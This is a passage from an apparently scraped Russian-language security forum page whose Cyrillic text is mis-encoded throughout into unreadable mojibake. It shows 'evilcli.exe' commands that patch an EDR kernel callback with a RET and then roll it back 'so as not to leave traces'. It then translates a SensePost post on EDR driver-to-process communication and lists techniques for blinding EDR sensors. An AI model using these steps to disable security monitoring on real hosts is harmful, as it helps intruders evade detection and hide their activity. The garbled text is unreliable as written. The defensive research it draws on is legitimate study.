		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>C:\Users\matteo\Desktop\Debug&gt;evilcli.exe -p 7
Patching index: 7 with a RET (0xc3)</code></pre>
	</div>
</div><br />
3)–í–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∫–æ–ª–ª–±—ç–∫ –≤ –µ–≥–æ –∏—Å—Ö–æ–¥–Ω–æ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –ø–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –Ω—É–∂–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π.<br />
<br />
–•–æ—Ç—å —É –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–∞ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–æ–≤/EDR –Ω–µ—Ç –∫–æ–Ω—Ç—Ä–æ–ª—è —Ü–µ–ª–æ—Å—Ç–Ω–æ—Å—Ç–∏ –∫–æ–¥–∞, –Ω–æ –ª—É—á—à–µ –ø–µ—Ä–µ—Å—Ç—Ä–∞—Ö–æ–≤–∞—Ç—å—Å—è, –æ—Å–æ–±–µ–Ω–Ω–æ —á—Ç–æ–±—ã –Ω–µ –æ—Å—Ç–∞–≤–∏—Ç—å —Å–ª–µ–¥–æ–≤.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>C:\Users\matteo\Desktop\Debug&gt;evilcli.exe -r 7
Rolling back patched index: 7 to the original values</code></pre>
	</div>
</div><br />
–ü–æ –º–æ—Ç–∏–≤–∞–º —ç—Ç–æ–π —Å—Ç–∞—Ç—å–∏:<a href="https://www.matteomalvica.com/blog/2020/07/15/silencing-the-edr/" target="_blank" class="link link--external" rel="noopener">Silencing the EDR. How to disable process, threads and image-loading detection callbacks. ::   ‚Äî uf0</a></div>
						

							<h2>–û–±—Ö–æ–¥–∏–º –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—ã –∏ EDR</h2>

							

							

							<div class="bbWrapper">–û—Ä–∏–≥–∏–Ω–∞–ª:<a href="https://sensepost.com/blog/2023/filter-mute-operation-investigating-edr-internal-communication/" target="_blank" class="link link--external" rel="noopener">SensePost |   Filter-mute operation: investigating edr internal communication</a><br />
<br />
–î–ª—è –Ω–∞—à–µ–π –µ–∂–µ–≥–æ–¥–Ω–æ–π –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–π —Ö–∞–∫–µ—Ä—Å–∫–æ–π –∫–æ–Ω—Ñ–µ—Ä–µ–Ω—Ü–∏–∏, –∫–æ—Ç–æ—Ä—É—é –º—ã –Ω–∞–∑–≤–∞–ª–∏ SenseCon –≤ 2023 –≥–æ–¥—É, —è —Ä–µ—à–∏–ª –∏–∑—É—á–∏—Ç—å –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ –º–µ–∂–¥—É –¥—Ä–∞–π–≤–µ—Ä–æ–º Windows –∏ –µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–æ–º –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º —Ä–µ–∂–∏–º–µ.<br />
<br />
<b>–í–æ—Ç –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –ø–æ–¥—Ä–æ–±–Ω–æ—Å—Ç–∏ –æ–± —ç—Ç–æ–º –ø—É—Ç–µ—à–µ—Å—Ç–≤–∏–∏:</b><br />
<br />
–ê—Ç–∞–∫—É—é—â–∏–µ –º–æ–≥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø—Ä–∏–º–∏—Ç–∏–≤ —ç–∫—Å–ø–ª–æ–π—Ç–∞ —á—Ç–µ–Ω–∏—è/–∑–∞–ø–∏—Å–∏ —è–¥—Ä–∞ Windows, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è –º–µ–∂–¥—É EDR_Driver.sys –∏ –µ–≥–æ EDR_process.exe. –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –º–µ—Ö–∞–Ω–∏–∑–º—ã –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è EDR –±—É–¥—É—Ç –æ—Ç–∫–ª—é—á–µ–Ω—ã, —á—Ç–æ —Å–¥–µ–ª–∞–µ—Ç –µ–≥–æ (—á–∞—Å—Ç–∏—á–Ω–æ) —Å–ª–µ–ø—ã–º –∫ –∑–ª–æ–Ω–∞–º–µ—Ä–µ–Ω–Ω—ã–º –ø–æ–ª–µ–∑–Ω—ã–º –Ω–∞–≥—Ä—É–∑–∫–∞–º.<br />
<br />
<b><u>–≠—Ç–æ—Ç –±–ª–æ–≥ –æ–ø–∏—Å—ã–≤–∞–µ—Ç –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –ø–æ–¥—Ö–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ —É–¥–∞–ª—è–µ—Ç –∫–æ–ª–±—ç–∫–∏ —è–¥—Ä–∞ –∏ –¥–∞–µ—Ç –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –∑–∞—â–∏—Ç–µ –æ—Ç —ç—Ç–æ–π –∞—Ç–∞–∫–∏ &quot;–∑–∞–≥–ª—É—à–µ–Ω–∏—è —Ñ–∏–ª—å—Ç—Ä–∞&quot;. </u><br />
<br />
–û–±–∑–æ—Ä —Ä–æ–ª–µ–π EDR_process.exe –∏ EDR_Driver.sys</b><br />
<br />
–ü–µ—Ä–≤—ã–π –≤–æ–ø—Ä–æ—Å, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–∏—Ö–æ–¥–∏—Ç –Ω–∞ —É–º, —ç—Ç–æ –∫–∞–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ EDR (EDR_Process.exe) –æ–±—â–∞–µ—Ç—Å—è —Å–æ —Å–≤–æ–∏–º –¥—Ä–∞–π–≤–µ—Ä–æ–º EDR (EDR_Driver.sys)?<br />
<br />
–ü—Ä–µ–∂–¥–µ —á–µ–º –ø—Ä–æ–≤–æ–¥–∏—Ç—å –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ, –Ω–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∑–Ω–∞—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –æ—Å–Ω–æ–≤—ã EDR; –∫–∞–∫ –∞–≥–µ–Ω—Ç EDR –≤–Ω–µ–¥—Ä—è–µ—Ç —Å–≤–æ—é —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—É—é DLL –≤ –ø—Ä–æ—Ü–µ—Å—Å –ø—Ä–∏ –µ–≥–æ —Å–æ–∑–¥–∞–Ω–∏–∏?<br />
–°—Ö–µ–º–∞ –≤–Ω–µ–¥—Ä–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ —á–µ—Ä–µ–∑ –∫–æ–ª–±—ç–∫–∏, –≤–∑—è—Ç–∞—è –∏–∑ –Ω–∞–±–ª—é–¥–µ–Ω–∏–π EDR, <a href="https://signal-labs.com/edr-observations/" target="_blank" class="link link--external" rel="noopener">—Å–¥–µ–ª–∞–Ω–Ω—ã—Ö –ö—Ä–∏—Å—Ç–æ—Ñ–µ—Ä–æ–º –í–µ–ª–ª–æ–π, —è–≤–ª—è–µ—Ç—Å—è —Ö–æ—Ä–æ—à–∏–º —Ä–µ–∑—é–º–µ.</a><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796764519.png"
		data-src="https://osint42.org/attachments/1746796764519-png.327/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796764519-png.327/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796764519.png"
			title="1746796764519.png"
			width="981" height="814" loading="lazy" />
	</div><br />
<br />
–Ø –¥–æ–±–∞–≤–∏–ª –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏ –æ —Ç–æ–º, —á—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç:<br />
<ul>
<li data-xf-list-type="ul">EDR_Driver.sys –º–æ–∂–µ—Ç –ø–æ–¥–ø–∏—Å–∞—Ç—å—Å—è –Ω–∞ –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ç–∏–ø–æ–≤ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π —è–¥—Ä–∞. –ú–æ–∂–Ω–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç—å, —á—Ç–æ —ç—Ç–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø–æ—Ö–æ–∂–∏ –Ω–∞ &quot;—Ä–∞—Å—Å—ã–ª–∫–∏&quot;, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–µ –≤—ã –ø–æ–¥–ø–∏—Å—ã–≤–∞–µ—Ç–µ—Å—å –≤ –ò–Ω—Ç–µ—Ä–Ω–µ—Ç–µ –∏ –ø–æ–ª—É—á–∞–µ—Ç–µ –ø–æ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç–µ –æ—Ç –≤–µ–±-—Å–∞–π—Ç–∞. –ù–∞–ø—Ä–∏–º–µ—Ä, EDR_Driver.sys –º–æ–∂–µ—Ç –ø–æ–¥–ø–∏—Å–∞—Ç—å—Å—è –Ω–∞ —Å–ª—É–∂–±—É —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –æ &quot;—Å–æ–∑–¥–∞–Ω–∏–∏ –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞&quot;, –∏—Å–ø–æ–ª—å–∑—É—è API Windows, –Ω–∞–∑–≤–∞–Ω–Ω—ã–π PsSetCreateProcessNotifyRoutine, –ø–æ—Å–ª–µ —á–µ–≥–æ, –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ —Å–∏—Å—Ç–µ–º–æ–π, –¥—Ä–∞–π–≤–µ—Ä –±—É–¥–µ—Ç –ø–æ–ª—É—á–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –Ω–µ–º (—Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–π PID, –∫–æ–º–∞–Ω–¥–Ω—É—é —Å—Ç—Ä–æ–∫—É –∏ —Ç.–¥.)</li>
<li data-xf-list-type="ul">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–≤–∞–∂–¥—ã –∫–ª–∏–∫–∞–µ—Ç –ø–æ malware.exe</li>
<li data-xf-list-type="ul">Windows –≤—ã–∑—ã–≤–∞–µ—Ç API CreateProcessW –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ malware.exe –≤ –ø–∞–º—è—Ç—å</li>
<li data-xf-list-type="ul">EDR_Driver.sys –ø–æ–ª—É—á–∞–µ—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ —Ç–æ–º, —á—Ç–æ –±—É–¥–µ—Ç –∑–∞–ø—É—â–µ–Ω malware.exe.</li>
<li data-xf-list-type="ul">EDR_Driver.sys –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –ª–æ–≥ –≤ EDR_Process.exe —Å —Å–æ–æ–±—â–µ–Ω–∏–µ–º: &quot;–≠–π! –°–∫–æ—Ä–æ –±—É–¥–µ—Ç –∑–∞–ø—É—â–µ–Ω –Ω–æ–≤—ã–π –ø—Ä–æ—Ü–µ—Å—Å –ø–æ–¥ –Ω–∞–∑–≤–∞–Ω–∏–µ–º malware.exe.&quot;</li>
<li data-xf-list-type="ul">EDR_process.exe –º–æ–∂–µ—Ç –≤—ã–±—Ä–∞—Ç—å –¥–µ–π—Å—Ç–≤–∏–µ (–∏–ª–∏ –Ω–µ –¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å): &quot;–û–∫–µ–π, —è –±—É–¥—É –º–æ–Ω–∏—Ç–æ—Ä–∏—Ç—å —ç—Ç–æ—Ç –ø—Ä–æ—Ü–µ—Å—Å, —Å–æ–∑–¥–∞–≤–∞—è —Ö—É–∫–∏ –≤ –µ–≥–æ ntdll.dll&quot;</li>
<li data-xf-list-type="ul">–ö–æ–≥–¥–∞ malware.exe –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è, –æ–Ω –≤—ã–∑—ã–≤–∞–µ—Ç API Windows. –ë–ª–∞–≥–æ–¥–∞—Ä—è —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–º —Ö—É–∫–∞–º, EDR_Process.exe –∑–Ω–∞–µ—Ç, –∫–∞–∫–∏–µ API –≤—ã–∑—ã–≤–∞—é—Ç—Å—è, –∏ –º–æ–∂–µ—Ç –≤—ã—è—Å–Ω–∏—Ç—å, —á—Ç–æ –¥–µ–ª–∞–µ—Ç malware.exe</li>
</ul>–í –∫–∞—á–µ—Å—Ç–≤–µ –ø—Ä–∏–º–µ—Ä–∞ malware.exe –º—ã –º–æ–≥–ª–∏ –±—ã –≤–∑—è—Ç—å —Å–ª–µ–¥—É—é—â–∏–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ <a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-injection" target="_blank" class="link link--external" rel="noopener">—Å —Å–∞–π—Ç–∞ ired.team.</a><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796775302.png"
		data-src="https://osint42.org/attachments/1746796775302-png.328/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796775302-png.328/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796775302.png"
			title="1746796775302.png"
			width="1024" height="695" loading="lazy" />
	</div><br />
<br />
–ö–∞–∫ —Ç–æ–ª—å–∫–æ —Ö—É–∫–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã, –∞–≥–µ–Ω—Ç EDR (EDR_process.exe) –º–æ–∂–µ—Ç –º–æ–Ω–∏—Ç–æ—Ä–∏—Ç—å / –∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å malware.exe. –í–æ—Ç –ø—Ä–∏–º–µ—Ä –¥–µ–π—Å—Ç–≤–∏–π, –∫–æ—Ç–æ—Ä—ã–µ –æ–Ω –º–æ–∂–µ—Ç –ø—Ä–µ–¥–ø—Ä–∏–Ω—è—Ç—å:<br />
<ol>
<li data-xf-list-type="ol">EDR_Process.exe –≤–∏–¥–∏—Ç —Å–ª–µ–¥—É—é—â–∏–µ –≤—ã–∑–æ–≤—ã Windows API, –∫–æ—Ç–æ—Ä—ã–µ –¥–µ–ª–∞–µ—Ç malware.exe:<br />
OpenProcess VirtualAllocEx WriteProcessMemory CreateRemoteThread</li>
<li data-xf-list-type="ol">EDR_Process.exe –∫–ª–∞—Å—Å–∏—Ñ–∏—Ü–∏—Ä—É–µ—Ç —ç—Ç—É –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≤—ã–∑–æ–≤–æ–≤ API –∫–∞–∫ &quot;–≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—É—é&quot; –∏ –±–ª–æ–∫–∏—Ä—É–µ—Ç (—É–±–∏–≤–∞–µ—Ç) –ø—Ä–æ—Ü–µ—Å—Å.</li>
<li data-xf-list-type="ol">EDR_Process.exe –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –ª–æ–≥ –Ω–∞ EDR_C2 (–∫–æ–Ω—Å–æ–ª—å –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏) —Å —Å–æ–æ–±—â–µ–Ω–∏–µ–º: &quot;–≠–π, –ø—Ä–æ—Ü–µ—Å—Å malware.exe –∑–∞–ø—É—â–µ–Ω –∏ –∫–ª–∞—Å—Å–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω –∫–∞–∫ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π&quot;.</li>
</ol>–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ: —ç—Ç–æ –æ–±—ã—á–Ω—ã–π –ø–æ—Ç–æ–∫ EDR –∏ –Ω–µ –µ–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω—ã–π —Å–ø–æ—Å–æ–± –µ–≥–æ —Ä–∞–±–æ—Ç—ã, –Ω–∞–ø—Ä–∏–º–µ—Ä, EDR_Process.exe –º–æ–∂–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å —Ç–æ–ª—å–∫–æ –¥–∞–Ω–Ω—ã–µ —Ç–µ–ª–µ–º–µ—Ç—Ä–∏–∏ –∏ –ø–æ–∑–≤–æ–ª—è—Ç—å EDR_C2 —Ä–µ—à–∏—Ç—å, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ —ç—Ç–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º –∏ –∫–∞–∫–∏–µ –¥–µ–π—Å—Ç–≤–∏—è –ø—Ä–∏–º–µ–Ω—è—Ç—å (–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –∏–ª–∏ –Ω–µ—Ç).<br />
–ï—Å–ª–∏ –ø–æ—Å—Ç–∞–≤—â–∏–∫ EDR –∏–ª–∏ –æ–ø–µ—Ä–∞—Ç–æ—Ä—ã –∫–æ–º–∞–Ω–¥—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ (–∏–∑–≤–µ—Å—Ç–Ω—ã–µ –∫–∞–∫ blueteam) –Ω–∞—Å—Ç—Ä–æ–∏–ª–∏ –ø—Ä–∞–≤–∏–ª–æ &quot;–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å, –µ—Å–ª–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ&quot; –≤ –ö–æ–Ω—Å–æ–ª–∏ –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ EDR, —Ç–æ –ø—Ä–æ—Ü–µ—Å—Å malware.exe —É–±–∏–≤–∞–µ—Ç—Å—è EDR_Process.exe (–∏–ª–∏ EDR_Driver.sys). –¢–∞–∫–∂–µ –¥–æ—Å—Ç—É–ø–Ω—ã –¥—Ä—É–≥–∏–µ –∫–æ–Ω—Ç—Ä–º–µ—Ä—ã, –Ω–∞–ø—Ä–∏–º–µ—Ä:<br />
<ul>
<li data-xf-list-type="ul">Windows-—Ö–æ—Å—Ç –º–æ–∂–µ—Ç –±—ã—Ç—å —É–¥–∞–ª–µ–Ω–Ω–æ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω –æ—Ç —Å–µ—Ç–∏</li>
<li data-xf-list-type="ul">—Ñ–∞–π–ª malware.exe –∏–ª–∏ –¥–∞–º–ø –ø–∞–º—è—Ç–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞–≥—Ä—É–∂–µ–Ω –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ / —Ä–µ–≤–µ—Ä—Å–∏–Ω–≥–∞</li>
<li data-xf-list-type="ul">–∞–Ω–∞–ª–∏—Ç–∏–∫ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –º–æ–∂–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å –∫–æ–º–∞–Ω–¥—ã –Ω–∞ Windows-—Ö–æ—Å—Ç–µ (–∏–∑ –∫–æ–Ω—Å–æ–ª–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏) –¥–ª—è —Ü–µ–ª–µ–π —Ä–∞—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è</li>
<li data-xf-list-type="ul">‚Ä¶</li>
</ul>–≠—Ç–æ—Ç –º–æ–º–µ–Ω—Ç –≤–∞–∂–µ–Ω; —á–µ–º –±–æ–ª–µ–µ –æ–ø—ã—Ç–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ blueteam –≤ —Å–æ–∑–¥–∞–Ω–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –ø—Ä–∞–≤–∏–ª, —Ç–µ–º —Å–ª–æ–∂–Ω–µ–µ –∞—Ç–∞–∫—É—é—â–∏–º –∏–∑–±–µ–∂–∞—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –∏–ª–∏ –ø–µ—Ä–µ–º–µ—â–∞—Ç—å—Å—è –ø–æ —Å–µ—Ç–∏ –±–æ–∫–æ–≤—ã–º –æ–±—Ä–∞–∑–æ–º –±–µ–∑ –ø–æ–ø–∞–¥–∞–Ω–∏—è –≤ –ª–æ–≤—É—à–∫—É!<br />
–¢–µ–ø–µ—Ä—å, –ø—Ä–µ–∂–¥–µ —á–µ–º —É–≥–ª—É–±–ª—è—Ç—å—Å—è –≤–æ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–µ –æ–±—â–µ–Ω–∏–µ, —è —Ö–æ—á—É —Å–¥–µ–ª–∞—Ç—å —à–∞–≥ –Ω–∞–∑–∞–¥ –∏ —É–ø—Ä–æ—Å—Ç–∏—Ç—å –ø–æ–≤–µ–¥–µ–Ω–∏–µ EDR. –í–Ω—É—Ç—Ä–µ–Ω–Ω–µ–µ –æ–±—â–µ–Ω–∏–µ (—Å–∏–Ω–∏–µ —Å—Ç—Ä–µ–ª–∫–∏) –∏ –≤–Ω–µ—à–Ω–µ–µ –æ–±—â–µ–Ω–∏–µ (–∂–µ–ª—Ç—ã–µ —Å—Ç—Ä–µ–ª–∫–∏) EDR_Process.exe –º–æ–∂–Ω–æ –≤–∏–∑—É–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å —Å –ø–æ–º–æ—â—å—é –ø—Ä–æ—Å—Ç–æ–≥–æ –æ–±–∑–æ—Ä–∞:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796787570.png"
		data-src="https://osint42.org/attachments/1746796787570-png.329/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796787570-png.329/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796787570.png"
			title="1746796787570.png"
			width="1024" height="480" loading="lazy" />
	</div><br />
<br />
<b>–ò—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–≥–æ –æ–±—â–µ–Ω–∏—è EDR</b><br />
<br />
–ò–∑ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–∞ –ø–∞–º—è—Ç–∏ —è–¥—Ä–∞ Windows, EDR_Driver.sys –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ API —è–¥—Ä–∞ Windows (–∫–æ–ª–±—ç–∫–∏) –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞, –∞ –∑–∞—Ç–µ–º –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–µ–π.<br />
<br />
–ù–∞–ø—Ä–∏–º–µ—Ä, API-—Ñ—É–Ω–∫—Ü–∏—è PsSetCreateProcessNotifyRoutine –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Å–ª–µ–¥—É—é—â–∏—Ö —Å–æ–æ–±—â–µ–Ω–∏–π &quot;–∂—É—Ä–Ω–∞–ª–æ–≤ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞&quot; –±–ª–∞–≥–æ–¥–∞—Ä—è –º–µ—Ö–∞–Ω–∏–∑–º—É –∫–æ–ª–±—ç–∫–∞ —è–¥—Ä–∞:<br />
‚Äì –ñ—É—Ä–Ω–∞–ª = —Å–æ–∑–¥–∞–Ω –Ω–æ–≤—ã–π –ø—Ä–æ—Ü–µ—Å—Å (PID 5376) —Å –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–æ–π C:\notepad.exe<br />
<br />
–ò–∑ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–∞ –ø–∞–º—è—Ç–∏, EDR_Process.exe –º–æ–∂–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –∑–∞–ø—Ä–æ—Å—ã –Ω–∞ –¥–µ–π—Å—Ç–≤–∏—è –¥—Ä–∞–π–≤–µ—Ä—É –∏ –ø–æ–ª—É—á–∞—Ç—å –æ—Ç –Ω–µ–≥–æ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é. –ù–∞–ø—Ä–∏–º–µ—Ä, &quot;–ó–∞–ø—Ä–æ—Å –Ω–∞ –¥–µ–π—Å—Ç–≤–∏–µ&quot;, –ø–æ—Å—Ç—É–ø–∞—é—â–∏–π –∏–∑ –∫–æ–Ω—Å–æ–ª–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ EDR, –º–æ–∂–µ—Ç –±—ã—Ç—å:<br />
<br />
‚Äì –î–µ–π—Å—Ç–≤–∏–µ = –¥–æ–±–∞–≤–∏—Ç—å –≤ —á–µ—Ä–Ω—ã–π —Å–ø–∏—Å–æ–∫ C:\notepad.exe<br />
<br />
–ù–∞ —Ä–∏—Å—É–Ω–∫–µ –Ω–∏–∂–µ —è –ø–æ–ø—ã—Ç–∞–ª—Å—è –æ—Ç–æ–±—Ä–∞–∑–∏—Ç—å –æ–±—â–∏–µ –∫–æ–ª–±—ç–∫–∏ —è–¥—Ä–∞ Windows, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ –≤ —Ü–µ–ª—è—Ö –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796797631.png"
		data-src="https://osint42.org/attachments/1746796797631-png.330/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796797631-png.330/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796797631.png"
			title="1746796797631.png"
			width="1024" height="606" loading="lazy" />
	</div><br />
<br />
–í–æ–ø—Ä–æ—Å, –∫–æ—Ç–æ—Ä—ã–π –≤–æ–∑–Ω–∏–∫–∞–µ—Ç –ø–æ—Å–ª–µ —Å–æ–∑–¥–∞–Ω–∏—è —ç—Ç–æ–≥–æ —Ä–µ–∑—é–º–µ, –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, –∫–∞–∫ –∏–∑–±–µ–∂–∞—Ç—å –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è –º–µ–∂–¥—É EDR_process.exe –∏ EDR_driver.sys? –û—Å–ª–µ–ø–ª–µ–Ω–∏–µ EDR —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –∏–∑–≤–µ—Å—Ç–Ω—ã—Ö —Ç–µ—Ö–Ω–∏–∫<br />
<br />
<b><u>–ù–∞–∏–±–æ–ª–µ–µ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–Ω—ã–µ —Ç–µ—Ö–Ω–∏–∫–∏ –æ—Å–ª–µ–ø–ª–µ–Ω–∏—è –¥–∞—Ç—á–∏–∫–æ–≤ EDR –≤–∫–ª—é—á–∞—é—Ç –≤ —Å–µ–±—è:</u></b><br />
<ul>
<li data-xf-list-type="ul">–£–¥–∞–ª–µ–Ω–∏–µ —Ö—É–∫–æ–≤ DLL (–ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è)</li>
<li data-xf-list-type="ul">–£–¥–∞–ª–µ–Ω–∏–µ –∫–æ–ª–±—ç–∫–æ–≤ —è–¥—Ä–∞ (–ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ —è–¥—Ä–∞)</li>
